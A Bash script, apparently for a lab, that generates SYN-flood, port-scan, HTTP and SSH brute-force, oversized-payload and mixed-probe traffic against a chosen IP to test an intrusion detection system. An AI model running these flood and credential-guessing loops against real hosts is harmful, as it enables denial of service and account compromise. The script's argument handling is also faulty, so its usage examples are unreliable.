#!/bin/bash
# IDS Attack Simulation Suite for Kali Linux
# Run this from your Kali Linux VM to test the IDS system

# Configuration
IDS_IP="${1:-192.168.100.4}"  # Default IDS IP, or pass as first argument
IDS_PORT="${2:-5001}"         # Default IDS port
DURATION="${3:-10}"           # Default attack duration in seconds

# Colors for output
RED='\033[0;31m'
GREEN='\033[0;32m'
YELLOW='\033[1;33m'
BLUE='\033[0;34m'
NC='\033[0m' # No Color

echo -e "${BLUE}============================================================${NC}"
echo -e "${BLUE}  IDS Attack Simulation Suite (Kali Linux)${NC}"
echo -e "${BLUE}============================================================${NC}"
echo -e "Target: ${GREEN}$IDS_IP:$IDS_PORT${NC}"
echo -e "Duration: ${GREEN}${DURATION}s${NC} per attack"
echo ""

# Check connectivity
echo -e "${YELLOW}[*] Checking connectivity...${NC}"
if ! ping -c 2 -W 2 "$IDS_IP" > /dev/null 2>&1; then
    echo -e "${RED}[-] ERROR: Cannot reach $IDS_IP${NC}"
    echo "    Please check:"
    echo "    1. IDS server is running"
    echo "    2. Network connectivity"
    echo "    3. Correct IP address"
    exit 1
fi
echo -e "${GREEN}[+] Target is reachable${NC}"
echo ""

# Function to wait between attacks
wait_between() {
    echo -e "${YELLOW}    Waiting 3 seconds before next attack...${NC}"
    sleep 3
    echo ""
}

# Function to show status
show_status() {
    echo -e "${GREEN}    ✓ Attack completed${NC}"
    echo -e "${BLUE}    → Check Monitoring page at http://$IDS_IP:5173${NC}"
    echo -e "${YELLOW}    Waiting 5 seconds for IDS to process...${NC}"
    sleep 5
    echo ""
}

# 1. DoS Attack - SYN Flood
attack_dos() {
    echo -e "${BLUE}============================================================${NC}"
    echo -e "${BLUE}  [1/6] DoS Attack - SYN Flood${NC}"
    echo -e "${BLUE}============================================================${NC}"
    echo -e "${YELLOW}[DoS] Starting SYN flood on $IDS_IP:$IDS_PORT for ${DURATION}s...${NC}"
    
    if command -v hping3 &> /dev/null; then
        echo -e "${GREEN}    Using hping3 for SYN flood...${NC}"
        timeout $DURATION hping3 -S -p $IDS_PORT --flood "$IDS_IP" 2>&1 &
        HPING_PID=$!
        sleep $DURATION
        kill $HPING_PID 2>/dev/null
        wait $HPING_PID 2>/dev/null
        echo -e "${GREEN}    hping3 attack completed${NC}"
    else
        echo -e "${YELLOW}    hping3 not found, using Python fallback...${NC}"
        python3 << EOF
import socket
import time
import threading

target = "$IDS_IP"
port = $IDS_PORT
duration = $DURATION
running = True
total_packets = [0]

def flood():
    start = time.time()
    count = 0
    while running and (time.time() - start) < duration:
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.settimeout(0.01)
            s.connect_ex((target, port))
            s.close()
            count += 1
            total_packets[0] += 1
        except:
            count += 1
            total_packets[0] += 1
        # No sleep - maximum speed
    print(f"    Thread sent ~{count} packets")

# Use 20 threads for more aggressive attack
threads = [threading.Thread(target=flood, daemon=True) for _ in range(20)]
for t in threads:
    t.start()
time.sleep(duration)
running = False
for t in threads:
    t.join(timeout=1)
print(f"    Total: ~{total_packets[0]} packets sent")
EOF
    fi
    show_status
}

# 2. Probe Attack - Port Scan
attack_probe() {
    echo -e "${BLUE}============================================================${NC}"
    echo -e "${BLUE}  [2/6] Probe Attack - Port Scan${NC}"
    echo -e "${BLUE}============================================================${NC}"
    echo -e "${YELLOW}[Probe] Starting port scan on $IDS_IP for ${DURATION}s...${NC}"
    
    if command -v nmap &> /dev/null; then
        echo -e "${GREEN}    Using nmap for port scan...${NC}"
        # Scan more ports faster - T5 is fastest
        ports_to_scan=$((DURATION * 100))
        if [ $ports_to_scan -gt 2000 ]; then
            ports_to_scan=2000
        fi
        nmap -p 1-$ports_to_scan -T5 "$IDS_IP" 2>&1 | head -20
        echo -e "${GREEN}    Scanned $ports_to_scan ports${NC}"
    else
        echo -e "${YELLOW}    nmap not found, using netcat fallback...${NC}"
        ports_scanned=0
        for port in $(seq 1 $((DURATION * 50))); do
            timeout 0.05 nc -zv "$IDS_IP" $port > /dev/null 2>&1 &
            ports_scanned=$((ports_scanned + 1))
            if [ $((ports_scanned % 50)) -eq 0 ]; then
                wait  # Wait for batch to complete
            fi
        done
        wait
        echo -e "${GREEN}    Scanned $ports_scanned ports${NC}"
    fi
    show_status
}

# 3. Brute Force Attack
attack_brute() {
    echo -e "${BLUE}============================================================${NC}"
    echo -e "${BLUE}  [3/6] Brute Force Attack${NC}"
    echo -e "${BLUE}============================================================${NC}"
    echo -e "${YELLOW}[Brute Force] Starting HTTP brute force on $IDS_IP for ${DURATION}s...${NC}"
    
    passwords=("admin" "password" "123456" "root" "test" "guest" "qwerty" "letmein" "welcome" "monkey")
    attempts=0
    max_attempts=$((DURATION * 2))  # 2 attempts per second
    
    for i in $(seq 1 $max_attempts); do
        pass=${passwords[$((RANDOM % ${#passwords[@]}))]}
        curl -s -X POST "http://$IDS_IP:8080/login" \
            -d "username=admin&password=$pass" \
            -H "Content-Type: application/x-www-form-urlencoded" \
            --max-time 1 > /dev/null 2>&1
        attempts=$((attempts + 1))
        sleep 0.5
    done
    echo -e "${GREEN}    ✓ Made $attempts login attempts${NC}"
    show_status
}

# 4. R2L Attack - SSH Attempts
attack_r2l() {
    echo -e "${BLUE}============================================================${NC}"
    echo -e "${BLUE}  [4/6] R2L Attack - Remote to Local${NC}"
    echo -e "${BLUE}============================================================${NC}"
    echo -e "${YELLOW}[R2L] Starting SSH access attempts on $IDS_IP for ${DURATION}s...${NC}"
    
    usernames=("admin" "root" "user" "test" "guest" "administrator" "ubuntu" "debian")
    attempts=0
    max_attempts=$DURATION  # 1 attempt per second
    
    for i in $(seq 1 $max_attempts); do
        user=${usernames[$((RANDOM % ${#usernames[@]}))]}
        ssh -o ConnectTimeout=1 \
            -o StrictHostKeyChecking=no \
            -o UserKnownHostsFile=/dev/null \
            -o BatchMode=yes \
            "$user@$IDS_IP" "exit" > /dev/null 2>&1
        attempts=$((attempts + 1))
        sleep 1
    done
    echo -e "${GREEN}    ✓ Made $attempts SSH connection attempts${NC}"
    show_status
}

# 5. U2R Attack - Buffer Overflow
attack_u2r() {
    echo -e "${BLUE}============================================================${NC}"
    echo -e "${BLUE}  [5/6] U2R Attack - User to Root${NC}"
    echo -e "${BLUE}============================================================${NC}"
    echo -e "${YELLOW}[U2R] Starting buffer overflow attempts on $IDS_IP for ${DURATION}s...${NC}"
    
    attempts=0
    max_attempts=$DURATION  # 1 attempt per second
    
    for i in $(seq 1 $max_attempts); do
        python3 << EOF
import socket
try:
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.settimeout(1)
    s.connect(("$IDS_IP", $IDS_PORT))
    s.send(b'A' * 10000)  # Large buffer
    s.close()
except:
    pass
EOF
        attempts=$((attempts + 1))
        sleep 1
    done
    echo -e "${GREEN}    ✓ Made $attempts buffer overflow attempts${NC}"
    show_status
}

# 6. Unknown Attack - Mixed Pattern
attack_unknown() {
    echo -e "${BLUE}============================================================${NC}"
    echo -e "${BLUE}  [6/6] Unknown Attack - Mixed Pattern${NC}"
    echo -e "${BLUE}============================================================${NC}"
    echo -e "${YELLOW}[Unknown] Starting mixed attack pattern on $IDS_IP for ${DURATION}s...${NC}"
    
    start_time=$(date +%s)
    count=0
    
    while [ $(($(date +%s) - start_time)) -lt $DURATION ]; do
        # Random activity
        activity=$((RANDOM % 3))
        case $activity in
            0)
                # Port scan
                port=$((RANDOM % 65535 + 1))
                timeout 0.1 nc -zv "$IDS_IP" $port > /dev/null 2>&1
                ;;
            1)
                # SYN packet
                timeout 0.1 nc -zv "$IDS_IP" $((RANDOM % 65535 + 1)) > /dev/null 2>&1
                ;;
            2)
                # UDP packet
                echo "X" | timeout 0.1 nc -u "$IDS_IP" $((RANDOM % 65535 + 1)) > /dev/null 2>&1
                ;;
        esac
        count=$((count + 1))
        sleep 0.05
    done
    echo -e "${GREEN}    ✓ Generated $count mixed attack packets${NC}"
    show_status
}

# Main menu
show_menu() {
    echo -e "${BLUE}Select attack to run:${NC}"
    echo "  1) DoS Attack (SYN Flood)"
    echo "  2) Probe Attack (Port Scan)"
    echo "  3) Brute Force Attack"
    echo "  4) R2L Attack (SSH Attempts)"
    echo "  5) U2R Attack (Buffer Overflow)"
    echo "  6) Unknown Attack (Mixed Pattern)"
    echo "  7) Run ALL attacks sequentially"
    echo "  0) Exit"
    echo ""
    read -p "Enter choice [0-7]: " choice
    echo ""
    
    case $choice in
        1) attack_dos ;;
        2) attack_probe ;;
        3) attack_brute ;;
        4) attack_r2l ;;
        5) attack_u2r ;;
        6) attack_unknown ;;
        7)
            attack_dos
            attack_probe
            attack_brute
            attack_r2l
            attack_u2r
            attack_unknown
            echo -e "${GREEN}============================================================${NC}"
            echo -e "${GREEN}  All attacks completed!${NC}"
            echo -e "${GREEN}============================================================${NC}"
            echo -e "${BLUE}Check your IDS Monitoring page to see detections.${NC}"
            ;;
        0)
            echo "Exiting..."
            exit 0
            ;;
        *)
            echo -e "${RED}Invalid choice${NC}"
            show_menu
            ;;
    esac
}

# Check if arguments provided (non-interactive mode)
if [ $# -ge 1 ] && [ "$1" != "--menu" ]; then
    # Non-interactive: run all attacks
    if [ "$1" = "--all" ] || [ "$1" = "all" ]; then
        attack_dos
        attack_probe
        attack_brute
        attack_r2l
        attack_u2r
        attack_unknown
        echo -e "${GREEN}============================================================${NC}"
        echo -e "${GREEN}  All attacks completed!${NC}"
        echo -e "${GREEN}============================================================${NC}"
    else
        # Run specific attack
        case "$1" in
            dos|DoS) attack_dos ;;
            probe|Probe) attack_probe ;;
            brute|Brute) attack_brute ;;
            r2l|R2L) attack_r2l ;;
            u2r|U2R) attack_u2r ;;
            unknown|Unknown) attack_unknown ;;
            *)
                echo "Usage: $0 [IDS_IP] [IDS_PORT] [DURATION]"
                echo "   or: $0 --all [IDS_IP] [IDS_PORT] [DURATION]"
                echo "   or: $0 [attack_type] [IDS_IP] [IDS_PORT] [DURATION]"
                echo ""
                echo "Attack types: dos, probe, brute, r2l, u2r, unknown"
                echo ""
                echo "Examples:"
                echo "  $0 192.168.100.4              # Interactive menu"
                echo "  $0 --all 192.168.100.4        # Run all attacks"
                echo "  $0 dos 192.168.100.4 5001 10 # DoS attack, 10 seconds"
                exit 1
                ;;
        esac
    fi
else
    # Interactive mode
    show_menu
fi

